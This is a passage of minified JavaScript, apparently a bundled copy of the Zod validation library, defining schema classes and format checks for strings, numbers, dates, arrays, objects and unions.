Error("Validation failed but no issues detected.");return{success:!1,get error(){if(this._error)return this._error;const n=new nn(t.common.issues);return this._error=n,this._error}}};function _e(t){if(!t)return{};const{errorMap:e,invalid_type_error:n,required_error:r,description:o}=t;if(e&&(n||r))throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);return e?{errorMap:e,description:o}:{errorMap:(a,s)=>a.code!=="invalid_type"?{message:s.defaultError}:typeof s.data>"u"?{message:r??s.defaultError}:{message:n??s.defaultError},description:o}}class Te{constructor(e){this.spa=this.safeParseAsync,this._def=e,this.parse=this.parse.bind(this),this.safeParse=this.safeParse.bind(this),this.parseAsync=this.parseAsync.bind(this),this.safeParseAsync=this.safeParseAsync.bind(this),this.spa=this.spa.bind(this),this.refine=this.refine.bind(this),this.refinement=this.refinement.bind(this),this.superRefine=this.superRefine.bind(this),this.optional=this.optional.bind(this),this.nullable=this.nullable.bind(this),this.nullish=this.nullish.bind(this),this.array=this.array.bind(this),this.promise=this.promise.bind(this),this.or=this.or.bind(this),this.and=this.and.bind(this),this.transform=this.transform.bind(this),this.brand=this.brand.bind(this),this.default=this.default.bind(this),this.catch=this.catch.bind(this),this.describe=this.describe.bind(this),this.pipe=this.pipe.bind(this),this.readonly=this.readonly.bind(this),this.isNullable=this.isNullable.bind(this),this.isOptional=this.isOptional.bind(this)}get description(){return this._def.description}_getType(e){return nr(e.data)}_getOrReturnCtx(e,n){return n||{common:e.parent.common,data:e.data,parsedType:nr(e.data),schemaErrorMap:this._def.errorMap,path:e.path,parent:e.parent}}_processInputParams(e){return{status:new yt,ctx:{common:e.parent.common,data:e.data,parsedType:nr(e.data),schemaErrorMap:this._def.errorMap,path:e.path,parent:e.parent}}}_parseSync(e){const n=this._parse(e);if(Gs(n))throw new Error("Synchronous parse encountered promise.");return n}_parseAsync(e){const n=this._parse(e);return Promise.resolve(n)}parse(e,n){const r=this.safeParse(e,n);if(r.success)return r.data;throw r.error}safeParse(e,n){var r;const o={common:{issues:[],async:(r=n==null?void 0:n.async)!==null&&r!==void 0?r:!1,contextualErrorMap:n==null?void 0:n.errorMap},path:(n==null?void 0:n.path)||[],schemaErrorMap:this._def.errorMap,parent:null,data:e,parsedType:nr(e)},i=this._parseSync({data:e,path:o.path,parent:o});return g0(o,i)}async parseAsync(e,n){const r=await this.safeParseAsync(e,n);if(r.success)return r.data;throw r.error}async safeParseAsync(e,n){const r={common:{issues:[],contextualErrorMap:n==null?void 0:n.errorMap,async:!0},path:(n==null?void 0:n.path)||[],schemaErrorMap:this._def.errorMap,parent:null,data:e,parsedType:nr(e)},o=this._parse({data:e,path:r.path,parent:r}),i=await(Gs(o)?o:Promise.resolve(o));return g0(r,i)}refine(e,n){const r=o=>typeof n=="string"||typeof n>"u"?{message:n}:typeof n=="function"?n(o):n;return this._refinement((o,i)=>{const a=e(o),s=()=>i.addIssue({code:V.custom,...r(o)});return typeof Promise<"u"&&a instanceof Promise?a.then(c=>c?!0:(s(),!1)):a?!0:(s(),!1)})}refinement(e,n){return this._refinement((r,o)=>e(r)?!0:(o.addIssue(typeof n=="function"?n(r,o):n),!1))}_refinement(e){return new dn({schema:this,typeName:fe.ZodEffects,effect:{type:"refinement",refinement:e}})}superRefine(e){return this._refinement(e)}optional(){return jn.create(this,this._def)}nullable(){return si.create(this,this._def)}nullish(){return this.nullable().optional()}array(){return rn.create(this,this._def)}promise(){return Qi.create(this,this._def)}or(e){return va.create([this,e],this._def)}and(e){return xa.create(this,e,this._def)}transform(e){return new dn({..._e(this._def),schema:this,typeName:fe.ZodEffects,effect:{type:"transform",transform:e}})}default(e){const n=typeof e=="function"?e:()=>e;return new Aa({..._e(this._def),innerType:this,defaultValue:n,typeName:fe.ZodDefault})}brand(){return new g1({typeName:fe.ZodBranded,type:this,..._e(this._def)})}catch(e){const n=typeof e=="function"?e:()=>e;return new Js({..._e(this._def),innerType:this,catchValue:n,typeName:fe.ZodCatch})}describe(e){const n=this.constructor;return new n({...this._def,description:e})}pipe(e){return Ka.create(this,e)}readonly(){return Qs.create(this)}isOptional(){return this.safeParse(void 0).success}isNullable(){return this.safeParse(null).success}}const r6=/^c[^\s-]{8,}$/i,i6=/^[a-z][a-z0-9]*$/,o6=/^[0-9A-HJKMNP-TV-Z]{26}$/,a6=/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,s6=/^(?!\.)(?!.*\.\.)([A-Z0-9_+-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,c6="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$";let Nl;const l6=/^(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))$/,u6=/^(([a-f0-9]{1,4}:){7}|::([a-f0-9]{1,4}:){0,6}|([a-f0-9]{1,4}:){1}:([a-f0-9]{1,4}:){0,5}|([a-f0-9]{1,4}:){2}:([a-f0-9]{1,4}:){0,4}|([a-f0-9]{1,4}:){3}:([a-f0-9]{1,4}:){0,3}|([a-f0-9]{1,4}:){4}:([a-f0-9]{1,4}:){0,2}|([a-f0-9]{1,4}:){5}:([a-f0-9]{1,4}:){0,1})([a-f0-9]{1,4}|(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2})))$/,d6=t=>t.precision?t.offset?new RegExp(`^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{${t.precision}}(([+-]\\d{2}(:?\\d{2})?)|Z)$`):new RegExp(`^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{${t.precision}}Z$`):t.precision===0?t.offset?new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(([+-]\\d{2}(:?\\d{2})?)|Z)$"):new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}Z$"):t.offset?new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?(([+-]\\d{2}(:?\\d{2})?)|Z)$"):new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?Z$");function f6(t,e){return!!((e==="v4"||!e)&&l6.test(t)||(e==="v6"||!e)&&u6.test(t))}class en extends Te{_parse(e){if(this._def.coerce&&(e.data=String(e.data)),this._getType(e)!==J.string){const i=this._getOrReturnCtx(e);return te(i,{code:V.invalid_type,expected:J.string,received:i.parsedType}),be}const r=new yt;let o;for(const i of this._def.checks)if(i.kind==="min")e.data.length<i.value&&(o=this._getOrReturnCtx(e,o),te(o,{code:V.too_small,minimum:i.value,type:"string",inclusive:!0,exact:!1,message:i.message}),r.dirty());else if(i.kind==="max")e.data.length>i.value&&(o=this._getOrReturnCtx(e,o),te(o,{code:V.too_big,maximum:i.value,type:"string",inclusive:!0,exact:!1,message:i.message}),r.dirty());else if(i.kind==="length"){const a=e.data.length>i.value,s=e.data.length<i.value;(a||s)&&(o=this._getOrReturnCtx(e,o),a?te(o,{code:V.too_big,maximum:i.value,type:"string",inclusive:!0,exact:!0,message:i.message}):s&&te(o,{code:V.too_small,minimum:i.value,type:"string",inclusive:!0,exact:!0,message:i.message}),r.dirty())}else if(i.kind==="email")s6.test(e.data)||(o=this._getOrReturnCtx(e,o),te(o,{validation:"email",code:V.invalid_string,message:i.message}),r.dirty());else if(i.kind==="emoji")Nl||(Nl=new RegExp(c6,"u")),Nl.test(e.data)||(o=this._getOrReturnCtx(e,o),te(o,{validation:"emoji",code:V.invalid_string,message:i.message}),r.dirty());else if(i.kind==="uuid")a6.test(e.data)||(o=this._getOrReturnCtx(e,o),te(o,{validation:"uuid",code:V.invalid_string,message:i.message}),r.dirty());else if(i.kind==="cuid")r6.test(e.data)||(o=this._getOrReturnCtx(e,o),te(o,{validation:"cuid",code:V.invalid_string,message:i.message}),r.dirty());else if(i.kind==="cuid2")i6.test(e.data)||(o=this._getOrReturnCtx(e,o),te(o,{validation:"cuid2",code:V.invalid_string,message:i.message}),r.dirty());else if(i.kind==="ulid")o6.test(e.data)||(o=this._getOrReturnCtx(e,o),te(o,{validation:"ulid",code:V.invalid_string,message:i.message}),r.dirty());else if(i.kind==="url")try{new URL(e.data)}catch{o=this._getOrReturnCtx(e,o),te(o,{validation:"url",code:V.invalid_string,message:i.message}),r.dirty()}else i.kind==="regex"?(i.regex.lastIndex=0,i.regex.test(e.data)||(o=this._getOrReturnCtx(e,o),te(o,{validation:"regex",code:V.invalid_string,message:i.message}),r.dirty())):i.kind==="trim"?e.data=e.data.trim():i.kind==="includes"?e.data.includes(i.value,i.position)||(o=this._getOrReturnCtx(e,o),te(o,{code:V.invalid_string,validation:{includes:i.value,position:i.position},message:i.message}),r.dirty()):i.kind==="toLowerCase"?e.data=e.data.toLowerCase():i.kind==="toUpperCase"?e.data=e.data.toUpperCase():i.kind==="startsWith"?e.data.startsWith(i.value)||(o=this._getOrReturnCtx(e,o),te(o,{code:V.invalid_string,validation:{startsWith:i.value},message:i.message}),r.dirty()):i.kind==="endsWith"?e.data.endsWith(i.value)||(o=this._getOrReturnCtx(e,o),te(o,{code:V.invalid_string,validation:{endsWith:i.value},message:i.message}),r.dirty()):i.kind==="datetime"?d6(i).test(e.data)||(o=this._getOrReturnCtx(e,o),te(o,{code:V.invalid_string,validation:"datetime",message:i.message}),r.dirty()):i.kind==="ip"?f6(e.data,i.version)||(o=this._getOrReturnCtx(e,o),te(o,{validation:"ip",code:V.invalid_string,message:i.message}),r.dirty()):Me.assertNever(i);return{status:r.value,value:e.data}}_regex(e,n,r){return this.refinement(o=>e.test(o),{validation:n,code:V.invalid_string,...ue.errToObj(r)})}_addCheck(e){return new en({...this._def,checks:[...this._def.checks,e]})}email(e){return this._addCheck({kind:"email",...ue.errToObj(e)})}url(e){return this._addCheck({kind:"url",...ue.errToObj(e)})}emoji(e){return this._addCheck({kind:"emoji",...ue.errToObj(e)})}uuid(e){return this._addCheck({kind:"uuid",...ue.errToObj(e)})}cuid(e){return this._addCheck({kind:"cuid",...ue.errToObj(e)})}cuid2(e){return this._addCheck({kind:"cuid2",...ue.errToObj(e)})}ulid(e){return this._addCheck({kind:"ulid",...ue.errToObj(e)})}ip(e){return this._addCheck({kind:"ip",...ue.errToObj(e)})}datetime(e){var n;return typeof e=="string"?this._addCheck({kind:"datetime",precision:null,offset:!1,message:e}):this._addCheck({kind:"datetime",precision:typeof(e==null?void 0:e.precision)>"u"?null:e==null?void 0:e.precision,offset:(n=e==null?void 0:e.offset)!==null&&n!==void 0?n:!1,...ue.errToObj(e==null?void 0:e.message)})}regex(e,n){return this._addCheck({kind:"regex",regex:e,...ue.errToObj(n)})}includes(e,n){return this._addCheck({kind:"includes",value:e,position:n==null?void 0:n.position,...ue.errToObj(n==null?void 0:n.message)})}startsWith(e,n){return this._addCheck({kind:"startsWith",value:e,...ue.errToObj(n)})}endsWith(e,n){return this._addCheck({kind:"endsWith",value:e,...ue.errToObj(n)})}min(e,n){return this._addCheck({kind:"min",value:e,...ue.errToObj(n)})}max(e,n){return this._addCheck({kind:"max",value:e,...ue.errToObj(n)})}length(e,n){return this._addCheck({kind:"length",value:e,...ue.errToObj(n)})}nonempty(e){return this.min(1,ue.errToObj(e))}trim(){return new en({...this._def,checks:[...this._def.checks,{kind:"trim"}]})}toLowerCase(){return new en({...this._def,checks:[...this._def.checks,{kind:"toLowerCase"}]})}toUpperCase(){return new en({...this._def,checks:[...this._def.checks,{kind:"toUpperCase"}]})}get isDatetime(){return!!this._def.checks.find(e=>e.kind==="datetime")}get isEmail(){return!!this._def.checks.find(e=>e.kind==="email")}get isURL(){return!!this._def.checks.find(e=>e.kind==="url")}get isEmoji(){return!!this._def.checks.find(e=>e.kind==="emoji")}get isUUID(){return!!this._def.checks.find(e=>e.kind==="uuid")}get isCUID(){return!!this._def.checks.find(e=>e.kind==="cuid")}get isCUID2(){return!!this._def.checks.find(e=>e.kind==="cuid2")}get isULID(){return!!this._def.checks.find(e=>e.kind==="ulid")}get isIP(){return!!this._def.checks.find(e=>e.kind==="ip")}get minLength(){let e=null;for(const n of this._def.checks)n.kind==="min"&&(e===null||n.value>e)&&(e=n.value);return e}get maxLength(){let e=null;for(const n of this._def.checks)n.kind==="max"&&(e===null||n.value<e)&&(e=n.value);return e}}en.create=t=>{var e;return new en({checks:[],typeName:fe.ZodString,coerce:(e=t==null?void 0:t.coerce)!==null&&e!==void 0?e:!1,..._e(t)})};function h6(t,e){const n=(t.toString().split(".")[1]||"").length,r=(e.toString().split(".")[1]||"").length,o=n>r?n:r,i=parseInt(t.toFixed(o).replace(".","")),a=parseInt(e.toFixed(o).replace(".",""));return i%a/Math.pow(10,o)}class wr extends Te{constructor(){super(...arguments),this.min=this.gte,this.max=this.lte,this.step=this.multipleOf}_parse(e){if(this._def.coerce&&(e.data=Number(e.data)),this._getType(e)!==J.number){const i=this._getOrReturnCtx(e);return te(i,{code:V.invalid_type,expected:J.number,received:i.parsedType}),be}let r;const o=new yt;for(const i of this._def.checks)i.kind==="int"?Me.isInteger(e.data)||(r=this._getOrReturnCtx(e,r),te(r,{code:V.invalid_type,expected:"integer",received:"float",message:i.message}),o.dirty()):i.kind==="min"?(i.inclusive?e.data<i.value:e.data<=i.value)&&(r=this._getOrReturnCtx(e,r),te(r,{code:V.too_small,minimum:i.value,type:"number",inclusive:i.inclusive,exact:!1,message:i.message}),o.dirty()):i.kind==="max"?(i.inclusive?e.data>i.value:e.data>=i.value)&&(r=this._getOrReturnCtx(e,r),te(r,{code:V.too_big,maximum:i.value,type:"number",inclusive:i.inclusive,exact:!1,message:i.message}),o.dirty()):i.kind==="multipleOf"?h6(e.data,i.value)!==0&&(r=this._getOrReturnCtx(e,r),te(r,{code:V.not_multiple_of,multipleOf:i.value,message:i.message}),o.dirty()):i.kind==="finite"?Number.isFinite(e.data)||(r=this._getOrReturnCtx(e,r),te(r,{code:V.not_finite,message:i.message}),o.dirty()):Me.assertNever(i);return{status:o.value,value:e.data}}gte(e,n){return this.setLimit("min",e,!0,ue.toString(n))}gt(e,n){return this.setLimit("min",e,!1,ue.toString(n))}lte(e,n){return this.setLimit("max",e,!0,ue.toString(n))}lt(e,n){return this.setLimit("max",e,!1,ue.toString(n))}setLimit(e,n,r,o){return new wr({...this._def,checks:[...this._def.checks,{kind:e,value:n,inclusive:r,message:ue.toString(o)}]})}_addCheck(e){return new wr({...this._def,checks:[...this._def.checks,e]})}int(e){return this._addCheck({kind:"int",message:ue.toString(e)})}positive(e){return this._addCheck({kind:"min",value:0,inclusive:!1,message:ue.toString(e)})}negative(e){return this._addCheck({kind:"max",value:0,inclusive:!1,message:ue.toString(e)})}nonpositive(e){return this._addCheck({kind:"max",value:0,inclusive:!0,message:ue.toString(e)})}nonnegative(e){return this._addCheck({kind:"min",value:0,inclusive:!0,message:ue.toString(e)})}multipleOf(e,n){return this._addCheck({kind:"multipleOf",value:e,message:ue.toString(n)})}finite(e){return this._addCheck({kind:"finite",message:ue.toString(e)})}safe(e){return this._addCheck({kind:"min",inclusive:!0,value:Number.MIN_SAFE_INTEGER,message:ue.toString(e)})._addCheck({kind:"max",inclusive:!0,value:Number.MAX_SAFE_INTEGER,message:ue.toString(e)})}get minValue(){let e=null;for(const n of this._def.checks)n.kind==="min"&&(e===null||n.value>e)&&(e=n.value);return e}get maxValue(){let e=null;for(const n of this._def.checks)n.kind==="max"&&(e===null||n.value<e)&&(e=n.value);return e}get isInt(){return!!this._def.checks.find(e=>e.kind==="int"||e.kind==="multipleOf"&&Me.isInteger(e.value))}get isFinite(){let e=null,n=null;for(const r of this._def.checks){if(r.kind==="finite"||r.kind==="int"||r.kind==="multipleOf")return!0;r.kind==="min"?(n===null||r.value>n)&&(n=r.value):r.kind==="max"&&(e===null||r.value<e)&&(e=r.value)}return Number.isFinite(n)&&Number.isFinite(e)}}wr.create=t=>new wr({checks:[],typeName:fe.ZodNumber,coerce:(t==null?void 0:t.coerce)||!1,..._e(t)});class br extends Te{constructor(){super(...arguments),this.min=this.gte,this.max=this.lte}_parse(e){if(this._def.coerce&&(e.data=BigInt(e.data)),this._getType(e)!==J.bigint){const i=this._getOrReturnCtx(e);return te(i,{code:V.invalid_type,expected:J.bigint,received:i.parsedType}),be}let r;const o=new yt;for(const i of this._def.checks)i.kind==="min"?(i.inclusive?e.data<i.value:e.data<=i.value)&&(r=this._getOrReturnCtx(e,r),te(r,{code:V.too_small,type:"bigint",minimum:i.value,inclusive:i.inclusive,message:i.message}),o.dirty()):i.kind==="max"?(i.inclusive?e.data>i.value:e.data>=i.value)&&(r=this._getOrReturnCtx(e,r),te(r,{code:V.too_big,type:"bigint",maximum:i.value,inclusive:i.inclusive,message:i.message}),o.dirty()):i.kind==="multipleOf"?e.data%i.value!==BigInt(0)&&(r=this._getOrReturnCtx(e,r),te(r,{code:V.not_multiple_of,multipleOf:i.value,message:i.message}),o.dirty()):Me.assertNever(i);return{status:o.value,value:e.data}}gte(e,n){return this.setLimit("min",e,!0,ue.toString(n))}gt(e,n){return this.setLimit("min",e,!1,ue.toString(n))}lte(e,n){return this.setLimit("max",e,!0,ue.toString(n))}lt(e,n){return this.setLimit("max",e,!1,ue.toString(n))}setLimit(e,n,r,o){return new br({...this._def,checks:[...this._def.checks,{kind:e,value:n,inclusive:r,message:ue.toString(o)}]})}_addCheck(e){return new br({...this._def,checks:[...this._def.checks,e]})}positive(e){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!1,message:ue.toString(e)})}negative(e){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!1,message:ue.toString(e)})}nonpositive(e){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!0,message:ue.toString(e)})}nonnegative(e){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!0,message:ue.toString(e)})}multipleOf(e,n){return this._addCheck({kind:"multipleOf",value:e,message:ue.toString(n)})}get minValue(){let e=null;for(const n of this._def.checks)n.kind==="min"&&(e===null||n.value>e)&&(e=n.value);return e}get maxValue(){let e=null;for(const n of this._def.checks)n.kind==="max"&&(e===null||n.value<e)&&(e=n.value);return e}}br.create=t=>{var e;return new br({checks:[],typeName:fe.ZodBigInt,coerce:(e=t==null?void 0:t.coerce)!==null&&e!==void 0?e:!1,..._e(t)})};class wa extends Te{_parse(e){if(this._def.coerce&&(e.data=!!e.data),this._getType(e)!==J.boolean){const r=this._getOrReturnCtx(e);return te(r,{code:V.invalid_type,expected:J.boolean,received:r.parsedType}),be}return St(e.data)}}wa.create=t=>new wa({typeName:fe.ZodBoolean,coerce:(t==null?void 0:t.coerce)||!1,..._e(t)});class oi extends Te{_parse(e){if(this._def.coerce&&(e.data=new Date(e.data)),this._getType(e)!==J.date){const i=this._getOrReturnCtx(e);return te(i,{code:V.invalid_type,expected:J.date,received:i.parsedType}),be}if(isNaN(e.data.getTime())){const i=this._getOrReturnCtx(e);return te(i,{code:V.invalid_date}),be}const r=new yt;let o;for(const i of this._def.checks)i.kind==="min"?e.data.getTime()<i.value&&(o=this._getOrReturnCtx(e,o),te(o,{code:V.too_small,message:i.message,inclusive:!0,exact:!1,minimum:i.value,type:"date"}),r.dirty()):i.kind==="max"?e.data.getTime()>i.value&&(o=this._getOrReturnCtx(e,o),te(o,{code:V.too_big,message:i.message,inclusive:!0,exact:!1,maximum:i.value,type:"date"}),r.dirty()):Me.assertNever(i);return{status:r.value,value:new Date(e.data.getTime())}}_addCheck(e){return new oi({...this._def,checks:[...this._def.checks,e]})}min(e,n){return this._addCheck({kind:"min",value:e.getTime(),message:ue.toString(n)})}max(e,n){return this._addCheck({kind:"max",value:e.getTime(),message:ue.toString(n)})}get minDate(){let e=null;for(const n of this._def.checks)n.kind==="min"&&(e===null||n.value>e)&&(e=n.value);return e!=null?new Date(e):null}get maxDate(){let e=null;for(const n of this._def.checks)n.kind==="max"&&(e===null||n.value<e)&&(e=n.value);return e!=null?new Date(e):null}}oi.create=t=>new oi({checks:[],coerce:(t==null?void 0:t.coerce)||!1,typeName:fe.ZodDate,..._e(t)});class qs extends Te{_parse(e){if(this._getType(e)!==J.symbol){const r=this._getOrReturnCtx(e);return te(r,{code:V.invalid_type,expected:J.symbol,received:r.parsedType}),be}return St(e.data)}}qs.create=t=>new qs({typeName:fe.ZodSymbol,..._e(t)});class ba extends Te{_parse(e){if(this._getType(e)!==J.undefined){const r=this._getOrReturnCtx(e);return te(r,{code:V.invalid_type,expected:J.undefined,received:r.parsedType}),be}return St(e.data)}}ba.create=t=>new ba({typeName:fe.ZodUndefined,..._e(t)});class ya extends Te{_parse(e){if(this._getType(e)!==J.null){const r=this._getOrReturnCtx(e);return te(r,{code:V.invalid_type,expected:J.null,received:r.parsedType}),be}return St(e.data)}}ya.create=t=>new ya({typeName:fe.ZodNull,..._e(t)});class Xi extends Te{constructor(){super(...arguments),this._any=!0}_parse(e){return St(e.data)}}Xi.create=t=>new Xi({typeName:fe.ZodAny,..._e(t)});class Fr extends Te{constructor(){super(...arguments),this._unknown=!0}_parse(e){return St(e.data)}}Fr.create=t=>new Fr({typeName:fe.ZodUnknown,..._e(t)});class Vn extends Te{_parse(e){const n=this._getOrReturnCtx(e);return te(n,{code:V.invalid_type,expected:J.never,received:n.parsedType}),be}}Vn.create=t=>new Vn({typeName:fe.ZodNever,..._e(t)});class Ks extends Te{_parse(e){if(this._getType(e)!==J.undefined){const r=this._getOrReturnCtx(e);return te(r,{code:V.invalid_type,expected:J.void,received:r.parsedType}),be}return St(e.data)}}Ks.create=t=>new Ks({typeName:fe.ZodVoid,..._e(t)});class rn extends Te{_parse(e){const{ctx:n,status:r}=this._processInputParams(e),o=this._def;if(n.parsedType!==J.array)return te(n,{code:V.invalid_type,expected:J.array,received:n.parsedType}),be;if(o.exactLength!==null){const a=n.data.length>o.exactLength.value,s=n.data.length<o.exactLength.value;(a||s)&&(te(n,{code:a?V.too_big:V.too_small,minimum:s?o.exactLength.value:void 0,maximum:a?o.exactLength.value:void 0,type:"array",inclusive:!0,exact:!0,message:o.exactLength.message}),r.dirty())}if(o.minLength!==null&&n.data.length<o.minLength.value&&(te(n,{code:V.too_small,minimum:o.minLength.value,type:"array",inclusive:!0,exact:!1,message:o.minLength.message}),r.dirty()),o.maxLength!==null&&n.data.length>o.maxLength.value&&(te(n,{code:V.too_big,maximum:o.maxLength.value,type:"array",inclusive:!0,exact:!1,message:o.maxLength.message}),r.dirty()),n.common.async)return Promise.all([...n.data].map((a,s)=>o.type._parseAsync(new $n(n,a,n.path,s)))).then(a=>yt.mergeArray(r,a));const i=[...n.data].map((a,s)=>o.type._parseSync(new $n(n,a,n.path,s)));return yt.mergeArray(r,i)}get element(){return this._def.type}min(e,n){return new rn({...this._def,minLength:{value:e,message:ue.toString(n)}})}max(e,n){return new rn({...this._def,maxLength:{value:e,message:ue.toString(n)}})}length(e,n){return new rn({...this._def,exactLength:{value:e,message:ue.toString(n)}})}nonempty(e){return this.min(1,e)}}rn.create=(t,e)=>new rn({type:t,minLength:null,maxLength:null,exactLength:null,typeName:fe.ZodArray,..._e(e)});function Ci(t){if(t instanceof qe){const e={};for(const n in t.shape){const r=t.shape[n];e[n]=jn.create(Ci(r))}return new qe({...t._def,shape:()=>e})}else return t instanceof rn?new rn({...t._def,type:Ci(t.element)}):t instanceof jn?jn.create(Ci(t.unwrap())):t instanceof si?si.create(Ci(t.unwrap())):t instanceof On?On.create(t.items.map(e=>Ci(e))):t}class qe extends Te{constructor(){super(...arguments),this._cached=null,this.nonstrict=this.passthrough,this.augment=this.extend}_getCached(){if(this._cached!==null)return this._cached;const e=this._def.shape(),n=Me.objectKeys(e);return this._cached={shape:e,keys:n}}_parse(e){if(this._getType(e)!==J.object){const l=this._getOrReturnCtx(e);return te(l,{code:V.invalid_type,expected:J.object,received:l.parsedType}),be}const{status:r,ctx:o}=this._processInputParams(e),{shape:i,keys:a}=this._getCached(),s=[];if(!(this._def.catchall instanceof Vn&&this._def.unknownKeys==="strip"))for(const l in o.data)a.includes(l)||s.push(l);const c=[];for(const l of a){const u=i[l],p=o.data[l];c.push({key:{status:"valid",value:l},value:u._parse(new $n(o,p,o.path,l)),alwaysSet:l in o.data})}if(this._def.catchall instanceof Vn){const l=this._def.unknownKeys;if(l==="passthrough")for(const u of s)c.push({key:{status:"valid",value:u},value:{status:"valid",value:o.data[u]}});else if(l==="strict")s.length>0&&(te(o,{code:V.unrecognized_keys,keys:s}),r.dirty());else if(l!=="strip")throw new Error("Internal ZodObject error: invalid unknownKeys value.")}else{const l=this._def.catchall;for(const u of s){const p=o.data[u];c.push({key:{status:"valid",value:u},value:l._parse(new $n(o,p,o.path,u)),alwaysSet:u in o.data})}}return o.common.async?Promise.resolve().then(async()=>{const l=[];for(const u of c){const p=await u.key;l.push({key:p,value:await u.value,alwaysSet:u.alwaysSet})}return l}).then(l=>yt.mergeObjectSync(r,l)):yt.mergeObjectSync(r,c)}get shape(){return this._def.shape()}strict(e){return ue.errToObj,new qe({...this._def,unknownKeys:"strict",...e!==void 0?{errorMap:(n,r)=>{var o,i,a,s;const c=(a=(i=(o=this._def).errorMap)===null||i===void 0?void 0:i.call(o,n,r).message)!==null&&a!==void 0?a:r.defaultError;return n.code==="unrecognized_keys"?{message:(s=ue.errToObj(e).message)!==null&&s!==void 0?s:c}:{message:c}}}:{}})}strip(){return new qe({...this._def,unknownKeys:"strip"})}passthrough(){return new qe({...this._def,unknownKeys:"passthrough"})}extend(e){return new qe({...this._def,shape:()=>({...this._def.shape(),...e})})}merge(e){return new qe({unknownKeys:e._def.unknownKeys,catchall:e._def.catchall,shape:()=>({...this._def.shape(),...e._def.shape()}),typeName:fe.ZodObject})}setKey(e,n){return this.augment({[e]:n})}catchall(e){return new qe({...this._def,catchall:e})}pick(e){const n={};return Me.objectKeys(e).forEach(r=>{e[r]&&this.shape[r]&&(n[r]=this.shape[r])}),new qe({...this._def,shape:()=>n})}omit(e){const n={};return Me.objectKeys(this.shape).forEach(r=>{e[r]||(n[r]=this.shape[r])}),new qe({...this._def,shape:()=>n})}deepPartial(){return Ci(this)}partial(e){const n={};return Me.objectKeys(this.shape).forEach(r=>{const o=this.shape[r];e&&!e[r]?n[r]=o:n[r]=o.optional()}),new qe({...this._def,shape:()=>n})}required(e){const n={};return Me.objectKeys(this.shape).forEach(r=>{if(e&&!e[r])n[r]=this.shape[r];else{let i=this.shape[r];for(;i instanceof jn;)i=i._def.innerType;n[r]=i}}),new qe({...this._def,shape:()=>n})}keyof(){return m1(Me.objectKeys(this.shape))}}qe.create=(t,e)=>new qe({shape:()=>t,unknownKeys:"strip",catchall:Vn.create(),typeName:fe.ZodObject,..._e(e)});qe.strictCreate=(t,e)=>new qe({shape:()=>t,unknownKeys:"strict",catchall:Vn.create(),typeName:fe.ZodObject,..._e(e)});qe.lazycreate=(t,e)=>new qe({shape:t,unknownKeys:"strip",catchall:Vn.create(),typeName:fe.ZodObject,..._e(e)});class va extends Te{_parse(e){const{ctx:n}=this._processInputParams(e),r=this._def.options;function o(i){for(const s of i)if(s.result.status==="valid")return s.result;for(const s of i)if(s.result.status==="dirty")return n.common.issues.push(...s.ctx.common.issues),s.result;const a=i.map(s=>new nn(s.ctx.common.issues));return te(n,{code:V.invalid_union,unionErrors:a}),be}if(n.common.async)return Promise.all(r.map(async i=>{const a={...n,common:{...n.common,issues:[]},parent:null};return{result:await i._parseAsync({data:n.data,path:n.path,parent:a}),ctx:a}})).then(o);{let i;const a=[];for(const c of r){const l={...n,common:{...n.common,issues:[]},parent:null},u=c._parseSync({data:n.data,path:n.path,parent:l});if(u.status==="valid")return u;u.status==="dirty"&&!i&&(i={result:u,ctx:l}),l.common.issues.length&&a.push(l.common.issues)}if(i)return n.common.issues.push(...i.ctx.common.issues),i.result;const s=a.map(c=>new nn(c));return te(n,{code:V.invalid_union,unionErrors:s}),be}}get options(){return this._def.options}}va.create=(t,e)=>new va({options:t,typeName:fe.ZodUnion,..._e(e)});const bs=t=>t instanceof Ea?bs(t.schema):t instanceof dn?bs(t.innerType()):t instanceof Ca?[t.value]:t instanceof yr?t.options:t instanceof Sa?Object.keys(t.enum):t instanceof Aa?bs(t._def.innerType):t instanceof ba?[void 0]:t instanceof ya?[null]:null;class qc extends Te{_parse(e){const{ctx:n}=this._processInputParams(e);if(n.parsedType!==J.object)return te(n,{code:V.invalid_type,expected:J.object,received:n.parsedType}),be;const r=this.discriminator,o=n.data[r],i=this.optionsMap.get(o);return i?n.common.async?i._parseAsync({data:n.data,path:n.path,parent:n}):i._parseSync({data:n.data,path:n.path,parent:n}):(te(n,{code:V.invalid_union_discriminator,options:Array.from(this.optionsMap.keys()),path:[r]}),be)}get discriminator(){return this._def.discriminator}get options(){return this._def.options}get optionsMap(){return this._def.optionsMap}static create(e,n,r){const o=new Map;for(const i of n){const a=bs(i.shape[e]);if(!a)throw new Error(`A discriminator value for key \`${e}\` could not be extracted from all schema options`);for(const s of a){if(o.has(s))throw new Error(`Discriminator property ${String(e)} has duplicate value ${String(s)}`);o.set(s,i)}}return new qc({typeName:fe.ZodDiscriminatedUnion,discriminator:e,options:n,optionsMap:o,..._e(r)})}}function Su(t,e){const n=nr(t),r=nr(e);if(t===e)return{valid:!0,data:t};if(n===J.object&&r===J.object){const o=Me.objectKeys(e),i=Me.objectKeys(t).filter(s=>o.indexOf(s)!==-1),a={...t,...e};for(const s of i){const 